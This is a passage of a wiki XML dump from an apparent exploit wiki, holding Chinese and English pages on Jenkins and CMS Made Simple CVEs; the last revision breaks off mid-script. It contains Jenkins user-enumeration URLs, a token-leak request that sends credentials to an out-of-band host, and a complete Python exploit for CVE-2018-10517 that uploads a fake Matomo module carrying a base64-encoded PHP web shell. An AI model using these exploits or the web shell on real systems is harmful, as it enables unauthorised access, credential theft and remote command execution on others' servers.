http://x.x.x.x:8080/search/suggest?query=a

http://x.x.x.x:8080/git/search/?q=a

http://x.x.x.x:8080/git/search/suggest?query=a
&lt;/pre&gt;</text>
      <sha1>0zt9ko5apjk4cu7qrzcwpupoylkqpto</sha1>
    </revision>
    <revision>
      <id>267</id>
      <parentid>266</parentid>
      <timestamp>2021-03-09T08:06:41Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>267</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="258" sha1="98lqvrmd7cry0x9zgp9wa61qtrm2kkx" xml:space="preserve">&lt;languages  /&gt;

&lt;translate&gt;
==漏洞利用== &lt;!--T:1--&gt;
模糊搜索：
&lt;/translate&gt;
&lt;pre&gt;
http://x.x.x.x:8080/search/?q=a

http://x.x.x.x:8080/search/suggest?query=a

http://x.x.x.x:8080/git/search/?q=a

http://x.x.x.x:8080/git/search/suggest?query=a
&lt;/pre&gt;</text>
      <sha1>98lqvrmd7cry0x9zgp9wa61qtrm2kkx</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-1000110 用戶枚舉漏洞/zh-hant</title>
    <ns>0</ns>
    <id>3066</id>
    <revision>
      <id>3567</id>
      <timestamp>2021-05-26T13:43:22Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2018-1000110 用戶枚舉漏洞"</comment>
      <origin>3567</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="222" sha1="1dzm39ks1runqyaunbkg1g0fzxgtmv8" xml:space="preserve">&lt;languages  /&gt;

==漏洞利用==
模糊搜索：
&lt;pre&gt;
http://x.x.x.x:8080/search/?q=a

http://x.x.x.x:8080/search/suggest?query=a

http://x.x.x.x:8080/git/search/?q=a

http://x.x.x.x:8080/git/search/suggest?query=a
&lt;/pre&gt;</text>
      <sha1>1dzm39ks1runqyaunbkg1g0fzxgtmv8</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-1000600 Jenkins GitHub 信息泄漏</title>
    <ns>0</ns>
    <id>179</id>
    <revision>
      <id>283</id>
      <timestamp>2021-03-09T08:13:44Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages   /&gt; &lt;translate&gt; ==影響版本== Jenkins GitHub插件小於1.29.1  利用的POC如下，其中user1為用戶名。 &lt;/translate&gt;  &lt;pre&gt; /securityRealm/user/user1/de..."</comment>
      <origin>283</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="310" sha1="fpp237nk8d1rbw2z5lveitq2f3yauoe" xml:space="preserve">&lt;languages   /&gt;
&lt;translate&gt;
==影響版本==
Jenkins GitHub插件小於1.29.1

利用的POC如下，其中user1為用戶名。
&lt;/translate&gt;

&lt;pre&gt;
/securityRealm/user/user1/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://xxx.ceye.io
&lt;/pre&gt;</text>
      <sha1>fpp237nk8d1rbw2z5lveitq2f3yauoe</sha1>
    </revision>
    <revision>
      <id>284</id>
      <parentid>283</parentid>
      <timestamp>2021-03-09T08:13:52Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>284</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="332" sha1="etz3jpfz7wfzuak8943ahux1naein6d" xml:space="preserve">&lt;languages   /&gt;
&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
Jenkins GitHub插件小於1.29.1

&lt;!--T:2--&gt;
利用的POC如下，其中user1為用戶名。
&lt;/translate&gt;

&lt;pre&gt;
/securityRealm/user/user1/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://xxx.ceye.io
&lt;/pre&gt;</text>
      <sha1>etz3jpfz7wfzuak8943ahux1naein6d</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-1000600 Jenkins GitHub 信息泄漏/en</title>
    <ns>0</ns>
    <id>3140</id>
    <revision>
      <id>3643</id>
      <timestamp>2021-05-30T11:39:15Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "The POC used is as follows, where user1 is the user name."</comment>
      <origin>3643</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="308" sha1="qugp1roetgjkdg71dfaghu15g1srxlp" xml:space="preserve">&lt;languages   /&gt;
==Affected version==
Jenkins GitHub plugin is less than 1.29.1

The POC used is as follows, where user1 is the user name.

&lt;pre&gt;
/securityRealm/user/user1/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://xxx.ceye.io
&lt;/pre&gt;</text>
      <sha1>qugp1roetgjkdg71dfaghu15g1srxlp</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-1000600 Jenkins GitHub 信息泄漏/zh-hant</title>
    <ns>0</ns>
    <id>3076</id>
    <revision>
      <id>3577</id>
      <timestamp>2021-05-26T13:59:07Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2018-1000600 Jenkins GitHub 信息泄漏"</comment>
      <origin>3577</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="285" sha1="04j3duhg2n2k6pnj8wqrc9rzu0nf7vh" xml:space="preserve">&lt;languages   /&gt;
==影響版本==
Jenkins GitHub插件小於1.29.1

利用的POC如下，其中user1為用戶名。

&lt;pre&gt;
/securityRealm/user/user1/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://xxx.ceye.io
&lt;/pre&gt;</text>
      <sha1>04j3duhg2n2k6pnj8wqrc9rzu0nf7vh</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-1000861遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>166</id>
    <revision>
      <id>268</id>
      <timestamp>2021-03-09T08:07:48Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== https://github.com/orangetw/awesome-jenkins-rce-2019"</comment>
      <origin>268</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="60" sha1="if7s2pjhwau6w6iatl1713mrkaa1z6g" xml:space="preserve">==EXP==
https://github.com/orangetw/awesome-jenkins-rce-2019</text>
      <sha1>if7s2pjhwau6w6iatl1713mrkaa1z6g</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-10517 CMS Made Simple 2.2.7遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>473</id>
    <revision>
      <id>674</id>
      <timestamp>2021-03-27T02:36:11Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; # Exploit Title: CMS Made Simple 2.2.7 - Remote Code Execution # Date: 2018-11-04 # Exploit Author: Lucian Ioan Nitescu # Contact: https://twitter.com/LucianNite..."</comment>
      <origin>674</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="20064" sha1="4kjv1ewzw45662zjvabcd3kybbxjl0u" xml:space="preserve">==POC==
&lt;pre&gt;
# Exploit Title: CMS Made Simple 2.2.7 - Remote Code Execution
# Date: 2018-11-04
# Exploit Author: Lucian Ioan Nitescu
# Contact: https://twitter.com/LucianNitescu
# Webiste: https://nitesculucian.github.io
# Vendor Homepage: https://www.cmsmadesimple.org/
# Software Link: https://www.cmsmadesimple.org/downloads/cmsms/
# Version: 2.2.7
# Tested on: Ubuntu 18.04
# CVE: CVE-2018-10517
 
# 1. Description:
# An attacker or a malicious user with access to the administration interface can execute code on the server.
 
# 2. Proof of Concept:
 
import requests
 
# target configuration (required admin credentials in order to obtain a valid session)
 
target_url="&lt;YOUR HTTP(S):// URL&gt;"
session_cookie = "&lt;YOUR SESSION COOKIE NAME&gt;"
session_value = "&lt;YOUR SESSION COOKIE VALUE&gt;"
 
# upload of shell unde the name of Matomo plugin
 
burp0_url = target_url + "/admin/moduleinterface.php"
 
burp0_cookies = {session_cookie: session_value}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://gk1v1ml3nfrd1bs00o69fmwnh.public2.attackdefenselabs.com/", "Content-Type": "multipart/form-data; boundary=---------------------------207726338310671742711263591267", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
burp0_data="-----------------------------207726338310671742711263591267\r\nContent-Disposition: form-data; name=\"mact\"\r\n\r\nModuleManager,m1_,local_import,0\r\n-----------------------------207726338310671742711263591267\r\nContent-Disposition: form-data; name=\"__c\"\r\n\r\n9a63802b6c4579cc01c\r\n-----------------------------207726338310671742711263591267\r\nContent-Disposition: form-data; name=\"m1_upload\"; filename=\"test.xml\"\r\nContent-Type: text/xml\r\n\r\n&lt;module&gt;\n    &lt;dtdversion&gt;1.3&lt;/dtdversion&gt;\n    &lt;name&gt;Matomo&lt;/name&gt;\n    &lt;version&gt;0.0.1&lt;/version&gt;\n    &lt;mincmsversion&gt;2.1.5&lt;/mincmsversion&gt;\n    &lt;help&gt;&lt;![CDATA[LS0gTWlzc2luZyBMYW5ndWFnZXN0cmluZzogaGVscCAtLQ==]]&gt;&lt;/help&gt;\n    &lt;about&gt;&lt;![CDATA[PGJyIC8+QXV0aG9yOiBleWVkZWUtbWVkaWEgJmx0O21vcnRlbkBwb3Vsc2VuLm9yZyZndDs8YnIgLz48YnIgLz5WZXJzaW9uOiAwLjAuMTxiciAvPjxiciAvPkNoYW5nZSBIaXN0b3J5OjxiciAvPi0tIE1pc3NpbmcgTGFuZ3VhZ2VzdHJpbmc6IGNoYW5nZWxvZyAtLTxiciAvPg==]]&gt;&lt;/about&gt;\n    &lt;description&gt;&lt;![CDATA[-- Missing Languagestring: admindescription --]]&gt;&lt;/description&gt;\n    &lt;file&gt;\n      &lt;filename&gt;/&lt;/filename&gt;\n      &lt;isdir&gt;1&lt;/isdir&gt;\n    &lt;/file&gt;\n    &lt;file&gt;\n      &lt;filename&gt;/action.admin_settings.php&lt;/filename&gt;\n      &lt;isdir&gt;0&lt;/isdir&gt;\n      &lt;data&gt;&lt;![CDATA[PCEtLSBTaW1wbGUgUEhQIEJhY2tkb29yIEJ5IERLIChPbmUtTGluZXIgVmVyc2lvbikgLS0+DQo8IS0tIFVzYWdlOiBodHRwOi8vdGFyZ2V0LmNvbS9zaW1wbGUtYmFja2Rvb3IucGhwP2NtZD1jYXQrL2V0Yy9wYXNzd2QgLS0+DQo8P3BocCBpZihpc3NldCgkX1JFUVVFU1RbJ2NtZCddKSl7IGVjaG8gIjxwcmU+IjsgJGNtZCA9ICgkX1JFUVVFU1RbJ2NtZCddKTsgc3lzdGVtKCRjbWQpOyBlY2hvICI8L3ByZT4iOyBkaWU7IH0/Pg==]]&gt;&lt;/data&gt;\n    &lt;/file&gt;\n    &lt;file&gt;\n      &lt;filename&gt;/action.admin_statistics.php&lt;/filename&gt;\n      &lt;isdir&gt;0&lt;/isdir&gt;\n      &lt;data&gt;&lt;![CDATA[PD9waHANCmlmICghZnVuY3Rpb25fZXhpc3RzKCJjbXNtcyIpKSByZXR1cm47DQokYXBpdG9rZW4gPSR0aGlzLT5HZXRQcmVmZXJlbmNlKCJhcGl0b2tlbiIpOw0KJHNpdGVpZD0kdGhpcy0+R2V0UHJlZmVyZW5jZSgic2l0ZWlkIik7DQokbGFuZ3VhZ2U9JHRoaXMtPkdldFByZWZlcmVuY2UoImxhbmd1YWdlIiwiZW4iKTsNCg0KJGVtYmVkX2Rhc2hib2FyZCA9ICc8aWZyYW1lIHN0eWxlPSJkaXNwbGF5OmJsb2NrOyIgc3JjPSInIC4gJHRoaXMtPkdldFByZWZlcmVuY2UoImJhc2V1cmwiKQ0KICAuICcvaW5kZXgucGhwP21vZHVsZT1XaWRnZXRpemUmYWN0aW9uPWlmcmFtZSZtb2R1bGVUb1dpZGdldGl6ZT1EYXNoYm9hcmQmYWN0aW9uVG9XaWRnZXRpemU9aW5kZXgmaWRTaXRlPScgLiAkc2l0ZWlkDQogIC4gJyZ0b2tlbl9hdXRoPScgLiAkYXBpdG9rZW4NCiAgLiAnJnBlcmlvZD1tb250aCcNCiAgLiAnJmRhdGU9dG9kYXknDQogIC4gJyZsYW5ndWFnZT0nLiRsYW5ndWFnZQ0KICAuICciIGZyYW1lYm9yZGVyPSIwIiBtYXJnaW5oZWlnaHQ9IjAiIG1hcmdpbndpZHRoPSIwIiB3aWR0aD0iMTAwJSIgaGVpZ2h0PSI4MDBweCcNCiAgLiAnIj48L2lmcmFtZT4nOw0KDQoNCmVjaG8gJGVtYmVkX2Rhc2hib2FyZDsNCg0KDQoNCi8qDQplY2hvICR0aGlzLT5TdGFydFRhYkhlYWRlcnMoKTsNCg0KZWNobyAkdGhpcy0+U2V0VGFiSGVhZGVyKCJiYXNlIiwiU2lkZXIiLCgkdGFiPT0icGFnZXMiKSk7DQplY2hvICR0aGlzLT5TZXRUYWJIZWFkZXIoInNla3Rpb25lciIsIlNla3Rpb25lciIsKCR0YWI9PSJzZWN0aW9ucyIpKTsNCi8vICBlY2hvICR0aGlzLT5TZXRUYWJIZWFkZXIoImluZHN0aWxsaW5nZXIiLCJJbmRzdGlsbGluZ2VyIiwoJHRhYj09InNldHRpbmdzIikpOw0KZWNobyAkdGhpcy0+RW5kVGFiSGVhZGVycygpOw0KDQplY2hvICR0aGlzLT5TdGFydFRhYkNvbnRlbnQoKTsNCmVjaG8gJHRoaXMtPlN0YXJ0VGFiKCJzaWRlciIpOw0KDQplY2hvICR0aGlzLT5FbmRUYWIoKTsNCg0KZWNobyAkdGhpcy0+U3RhcnRUYWIoInNla3Rpb25lciIpOw0KDQplY2hvICR0aGlzLT5FbmRUYWIoKTsNCg0KLyoNCmVjaG8gJHRoaXMtPlN0YXJ0VGFiKCJ1cGxvYWQiKTsNCiAgaW5jbHVkZV9vbmNlKGRpcm5hbWUoX19maWxlX18pLiIvdGFiLmluZHN0aWxsaW5nZXIucGhwIik7DQogIGVjaG8gJHRoaXMtPkVuZFRhYigpOw0KKi8NCi8vZWNobyAkdGhpcy0+RW5kVGFiQ29udGVudCgpOw0KDQoNCg0KLyoNCiRhcGl0b2tlbiA9JHRoaXMtPkdldFByZWZlcmVuY2UoImFwaXRva2VuIik7DQokc2l0ZWlkPSR0aGlzLT5HZXRQcmVmZXJlbmNlKCJzaXRlaWQiKTsNCg0KLy8gd2UgY2FsbCB0aGUgUkVTVCBBUEkgYW5kIHJlcXVlc3QgdGhlIDEwMCBmaXJzdCBrZXl3b3JkcyBmb3IgdGhlIGxhc3QgbW9udGggZm9yIHRoZSBpZHNpdGU9Nw0KJHVybCA9ICR0aGlzLT5HZXRQcmVmZXJlbmNlKCJiYXNldXJsIik7DQokdXJsIC49ICI/bW9kdWxlPUFQSSZtZXRob2Q9UmVmZXJyZXJzLmdldEtleXdvcmRzIjsNCiR1cmwgLj0gIiZpZFNpdGU9JHNpdGVpZCZwZXJpb2Q9bW9udGgmZGF0ZT15ZXN0ZXJkYXkiOw0KJHVybCAuPSAiJmZvcm1hdD1QSFAmZmlsdGVyX2xpbWl0PTIwIjsNCiR1cmwgLj0gIiZ0b2tlbl9hdXRoPSRhcGl0b2tlbiI7DQoNCiRmZXRjaGVkID0gZmlsZV9nZXRfY29udGVudHMoJHVybCk7DQovL2VjaG8gJGZldGNoZWQ7cmV0dXJuOw0KJGNvbnRlbnQgPSB1bnNlcmlhbGl6ZSgkZmV0Y2hlZCk7DQovL3ByaW50X3IoJGNvbnRlbnQpO3JldHVybjsNCg0KLy8gY2FzZSBlcnJvcg0KaWYgKCEkY29udGVudCkgew0KICBwcmludCgiRXJyb3IgcGFyc2luZyBkYXRhLCBjb250ZW50IGZldGNoZWQgPSAiIC4gJGZldGNoZWQpOw0KICByZXR1cm47DQp9DQoNCmlmICgkY29udGVudFsicmVzdWx0Il09PSJlcnJvciIpIHsNCiAgcHJpbnQoIkVycm9yLCBtZXNzYWdlID0gIiAuICRjb250ZW50WyJtZXNzYWdlIl0pOw0KICByZXR1cm47DQp9DQoNCnByaW50KCI8aDE+S2V5d29yZHMgZm9yIHRoZSBsYXN0IG1vbnRoPC9oMT5cbiIpOw0KZm9yZWFjaCAoJGNvbnRlbnQgYXMgJHJvdykgew0KICAka2V5d29yZCA9IGh0bWxzcGVjaWFsY2hhcnMoaHRtbF9lbnRpdHlfZGVjb2RlKHVybGRlY29kZSgkcm93WydsYWJlbCddKSwgRU5UX1FVT1RFUywgJ1VURi04JyksIEVOVF9RVU9URVMsICdVVEYtOCcpOw0KICAkaGl0cyA9ICRyb3dbJ25iX3Zpc2l0cyddOw0KDQogIHByaW50KCI8Yj4ka2V5d29yZDwvYj4gKCRoaXRzIGhpdHMpPGJyPlxuIik7DQp9DQoqLw0K]]&gt;&lt;/data&gt;\n    &lt;/file&gt;\n    &lt;file&gt;\n      &lt;filename&gt;/action.default.php&lt;/filename&gt;\n      &lt;isdir&gt;0&lt;/isdir&gt;\n      &lt;data&gt;&lt;![CDATA[PD9waHANCg0KZWNobyAkdGhpcy0+TmVvUHJvY2Vzc1RlbXBsYXRlRnJvbURhdGEoJHRoaXMtPkdldFRyYWNraW5nQ29kZSgpKTs=]]&gt;&lt;/data&gt;\n    &lt;/file&gt;\n    &lt;file&gt;\n      &lt;filename&gt;/action.savesettings.php&lt;/filename&gt;\n      &lt;isdir&gt;0&lt;/isdir&gt;\n      &lt;data&gt;&lt;![CDATA[PD9waHANCmlmICghZnVuY3Rpb25fZXhpc3RzKCJjbXNtcyIpKSByZXR1cm47DQppZiggISR0aGlzLT5DaGVja1Blcm1pc3Npb24oJ01vZGlmeSBTaXRlIFByZWZlcmVuY2VzJykgKSByZXR1cm47DQoNCg0KJHRoaXMtPk5lb1NhdmVWYWx1ZXMoJHBhcmFtcyxhcnJheSgNCiAgImJhc2V1cmwiLA0KICAidHJhY2tpbmdjb2RlIiwNCiAgImFwaXRva2VuIiwNCiAgInNpdGVpZCINCikpOw0KDQokdGhpcy0+UmVkaXJlY3QoJGlkLCAnYWRtaW5fc2V0dGluZ3MnLCAkcmV0dXJuaWQsYXJyYXkoInRhYiI9PiJzZXR0aW5ncyIsIm1vZHVsZV9tZXNzYWdlIj0+JHRoaXMtPkxhbmcoInNldHRpbmdzc2F2ZWQiKSkpOw0K]]&gt;&lt;/data&gt;\n    &lt;/file&gt;\n    &lt;file&gt;\n      &lt;filename&gt;/lang/&lt;/filename&gt;\n      &lt;isdir&gt;1&lt;/isdir&gt;\n    &lt;/file&gt;\n    &lt;file&gt;\n      &lt;filename&gt;/lang/en_US.php&lt;/filename&gt;\n      &lt;isdir&gt;0&lt;/isdir&gt;\n      &lt;data&gt;&lt;![CDATA[PD9waHANCi8qKg0KICogQ3JlYXRlZCBieSBQaHBTdG9ybS4NCiAqIFVzZXI6IG1vcnRlbg0KICogRGF0ZTogMjctMDktMjAxOA0KICogVGltZTogMDg6NTMNCiAqLw0KDQoNCiRsYW5nWyJ0aXRsZV9zdGF0aXN0aWNzIl09Ik1hdG9tbyBTdGF0aXN0aWNzIjsNCiRsYW5nWyJ0aXRsZV9zZXR0aW5ncyJdPSJNYXRvbW8gU2V0dGluZ3MiOw0KDQokbGFuZ1siYmFzZXVybCJdPSJCYXNlIFVSTCI7DQokbGFuZ1siYmFzZXVybGhlbHAiXT0iVGhlIGJhc2UgdXJsIG9mIHRoZSBNYXRvbW8taW5zdGFsbGF0aW9uLiBQbGVhc2UgaW5jbHVkZSBodHRwOi8vIG9yIGh0dHBzOi8vIjsNCiRsYW5nWyJhcGl0b2tlbiJdPSJBUEkgdG9rZW4iOw0KJGxhbmdbImFwaXRva2VuaGVscCJdPSJUaGUgQVBJIHRva2VuIGZvciBhY2Nlc3NpbmcgTWF0b21vLiBDYW4gYmUgb2J0YWluZWQgYWZ0ZXIgbG9nZ2luZyBpbnRvIHRoZSBNYXRvbW8gaW5zdGFsbGF0aW9uIjsNCiRsYW5nWyJzaXRlaWQiXT0iU2l0ZSBJRCI7DQokbGFuZ1sic2l0ZWlkaGVscCJdPSJUaGUgSUQgb2YgdGhlIHNpdGUgYXMgc2VlbiBieSB0aGUgTWF0b21vIGluc3RhbGxhdGlvbiI7DQokbGFuZ1sidHJhY2tpbmdjb2RlIl09IlRyYWNraW5nIGNvZGUiOw0KJGxhbmdbInRyYWNraW5nY29kZWhlbHAiXT0iVGhlIHRyYWNraW5nIGNvZGUgZnJvbSBNYXRvbW8gKHRoaXMgd2lsbCBwcm9iYWJseSBiZSBhdXRvZ2VuZXJhdGVkIGF0IGEgbGF0ZXIgdmVyc2lvbikiOw0KJGxhbmdbInNhdmVzZXR0aW5ncyJdPSJTYXZlIHNldHRpbmdzIjsNCiRsYW5nWyJzZXR0aW5nc3NhdmVkIl09IlNldHRpbmdzIHNhdmVkIjs=]]&gt;&lt;/data&gt;\n    &lt;/file&gt;\n    &lt;file&gt;\n      &lt;filename&gt;/Matomo.module.php&lt;/filename&gt;\n      &lt;isdir&gt;0&lt;/isdir&gt;\n      &lt;data&gt;&lt;![CDATA[]]&gt;&lt;/data&gt;\n    &lt;/file&gt;\n    &lt;file&gt;\n      &lt;filename&gt;/moduleinfo.ini&lt;/filename&gt;\n      &lt;isdir&gt;0&lt;/isdir&gt;\n      &lt;data&gt;&lt;![CDATA[W21vZHVsZV0KbmFtZSA9ICJNYXRvbW8iCnZlcnNpb24gPSAiMC4wLjEiCmF1dGhvciA9ICJleWVkZWUtbWVkaWEiCmF1dGhvcmVtYWlsID0gIm1vcnRlbkBwb3Vsc2VuLm9yZyIKbWluY21zdmVyc2lvbiA9ICIyLjEuNSIKbGF6eWxvYWRhZG1pbiA9IDAKbGF6eWxvYWRmcm9udGVuZCA9IDAK]]&gt;&lt;/data&gt;\n    &lt;/file&gt;\n    &lt;file&gt;\n      &lt;filename&gt;/templates/&lt;/filename&gt;\n      &lt;isdir&gt;1&lt;/isdir&gt;\n    &lt;/file&gt;\n    &lt;file&gt;\n      &lt;filename&gt;/templates/adminsettings.tpl&lt;/filename&gt;\n      &lt;isdir&gt;0&lt;/isdir&gt;\n      &lt;data&gt;&lt;![CDATA[e2Zvcm1fc3RhcnQgYWN0aW9uPSJzYXZlc2V0dGluZ3MifQ0KPGRpdiBjbGFzcz0icGFnZW92ZXJmbG93Ij4NCiAgICA8cCBjbGFzcz0icGFnZXRleHQiPg0KICAgICAgICA8bGFiZWwgZm9yPSJ7JGFpZH1mbGQxIj57JG1vZC0+bGFuZygiYmFzZXVybCIpfTo8L2xhYmVsPiB7KmNtc19oZWxwIGtleT0naGVscF9hcnRpY2xlX3VzZWV4cGlyeScgdGl0bGU9JHVzZWV4cGlyYXRpb250ZXh0Kn0NCiAgICA8L3A+DQogICAgPHAgY2xhc3M9InBhZ2VpbnB1dCI+DQogICAgICAgIDxpbnB1dCBpZD0ieyRhaWR9ZmxkMSIgdHlwZT0idGV4dCIgc2l6ZT0iNjQiIGxlbmd0aD0iNjQiIHZhbHVlPSJ7JG1vZC0+cHJmKCJiYXNldXJsIil9IiBuYW1lPSJ7JGFpZH1iYXNldXJsIj57JG1vZC0+bGFuZygiYmFzZXVybGhlbHAiKX0NCiAgICA8L3A+DQo8L2Rpdj4NCg0KPGRpdiBjbGFzcz0icGFnZW92ZXJmbG93Ij4NCiAgICA8cCBjbGFzcz0icGFnZXRleHQiPg0KICAgICAgICA8bGFiZWwgZm9yPSJ7JGFpZH1mbGQzIj57JG1vZC0+bGFuZygiYXBpdG9rZW4iKX06PC9sYWJlbD4geypjbXNfaGVscCBrZXk9J2hlbHBfYXJ0aWNsZV91c2VleHBpcnknIHRpdGxlPSR1c2VleHBpcmF0aW9udGV4dCp9DQogICAgPC9wPg0KICAgIDxwIGNsYXNzPSJwYWdlaW5wdXQiPg0KICAgICAgICA8aW5wdXQgaWQ9InskYWlkfWZsZDMiIHR5cGU9InRleHQiIHNpemU9IjY0IiBsZW5ndGg9IjY0IiB2YWx1ZT0ieyRtb2QtPnByZigiYXBpdG9rZW4iKX0iIG5hbWU9InskYWlkfWFwaXRva2VuIj57JG1vZC0+bGFuZygiYXBpdG9rZW5oZWxwIil9DQogICAgPC9wPg0KPC9kaXY+DQoNCjxkaXYgY2xhc3M9InBhZ2VvdmVyZmxvdyI+DQogICAgPHAgY2xhc3M9InBhZ2V0ZXh0Ij4NCiAgICAgICAgPGxhYmVsIGZvcj0ieyRhaWR9ZmxkNCI+eyRtb2QtPmxhbmcoInNpdGVpZCIpfTo8L2xhYmVsPiB7KmNtc19oZWxwIGtleT0naGVscF9hcnRpY2xlX3VzZWV4cGlyeScgdGl0bGU9JHVzZWV4cGlyYXRpb250ZXh0Kn0NCiAgICA8L3A+DQogICAgPHAgY2xhc3M9InBhZ2VpbnB1dCI+DQogICAgICAgIDxpbnB1dCBpZD0ieyRhaWR9ZmxkNCIgdHlwZT0idGV4dCIgc2l6ZT0iOCIgbGVuZ3RoPSI4IiB2YWx1ZT0ieyRtb2QtPnByZigic2l0ZWlkIil9IiBuYW1lPSJ7JGFpZH1zaXRlaWQiPnskbW9kLT5sYW5nKCJzaXRlaWRoZWxwIil9DQogICAgPC9wPg0KPC9kaXY+DQoNCjxkaXYgY2xhc3M9InBhZ2VvdmVyZmxvdyI+DQogICAgPHAgY2xhc3M9InBhZ2V0ZXh0Ij4NCiAgICAgICAgPGxhYmVsIGZvcj0ieyRhaWR9ZmxkMiI+eyRtb2QtPmxhbmcoInRyYWNraW5nY29kZSIpfTo8L2xhYmVsPiB7KmNtc19oZWxwIGtleT0naGVscF9hcnRpY2xlX3VzZWV4cGlyeScgdGl0bGU9JHVzZWV4cGlyYXRpb250ZXh0Kn0NCiAgICA8L3A+DQogICAgPHAgY2xhc3M9InBhZ2VpbnB1dCI+DQogICAgICAgIDx0ZXh0YXJlYSBpZD0ieyRhaWR9ZmxkMiIgcm93cz0iMTIiIGNvbHM9IjQwIiBuYW1lPSJ7JGFpZH10cmFja2luZ2NvZGUiPnskbW9kLT5wcmYoInRyYWNraW5nY29kZSIpfTwvdGV4dGFyZWE+DQogICAgICAgIDxici8+DQogICAgICAgIHskbW9kLT5sYW5nKCJ0cmFja2luZ2NvZGVoZWxwIil9DQogICAgPC9wPg0KPC9kaXY+DQoNCjxkaXYgY2xhc3M9InBhZ2VvdmVyZmxvdyI+DQogICAgPHAgY2xhc3M9InBhZ2V0ZXh0Ij4NCg0KICAgIDwvcD4NCiAgICA8cCBjbGFzcz0icGFnZWlucHV0Ij4NCiAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ieyRhaWR9c3VibWl0IiB2YWx1ZT0ieyRtb2QtPmxhbmcoInNhdmVzZXR0aW5ncyIpfSIvPg0KICAgIDwvcD4NCjwvZGl2Pg0KDQoNCntmb3JtX2VuZH0NCg==]]&gt;&lt;/data&gt;\n    &lt;/file&gt;\n&lt;/module&gt;\r\n-----------------------------207726338310671742711263591267--\r\n"
requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
 
print "Try to access your web shell at: " + target_url + "/modules/Matomo/action.admin_settings.php?cmd=ls%20-al" 
&lt;/pre&gt;</text>
      <sha1>4kjv1ewzw45662zjvabcd3kybbxjl0u</sha1>
    </revision>
    <revision>
      <id>675</id>
      <parentid>674</parentid>
      <timestamp>2021-03-27T02:36:38Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>675</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="20064" sha1="n2sd3d3g05c6n4et2crq77357suk3hm" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: CMS Made Simple 2.2.7 - Remote Code Execution
# Date: 2018-11-04
# Exploit Author: Lucian Ioan Nitescu
# Contact: https://twitter.com/LucianNitescu
# Webiste: https://nitesculucian.github.io
# Vendor Homepage: https://www.cmsmadesimple.org/
# Software Link: https://www.cmsmadesimple.org/downloads/cmsms/
# Version: 2.2.7
# Tested on: Ubuntu 18.04
# CVE: CVE-2018-10517
 
# 1. Description:
# An attacker or a malicious user with access to the administration interface can execute code on the server.
 
# 2. Proof of Concept:
 
import requests
 
# target configuration (required admin credentials in order to obtain a valid session)
 
target_url="&lt;YOUR HTTP(S):// URL&gt;"
session_cookie = "&lt;YOUR SESSION COOKIE NAME&gt;"
session_value = "&lt;YOUR SESSION COOKIE VALUE&gt;"
 
# upload of shell unde the name of Matomo plugin
 
burp0_url = target_url + "/admin/moduleinterface.php"
 
burp0_cookies = {session_cookie: session_value}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://gk1v1ml3nfrd1bs00o69fmwnh.public2.attackdefenselabs.com/", "Content-Type": "multipart/form-data; boundary=---------------------------207726338310671742711263591267", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
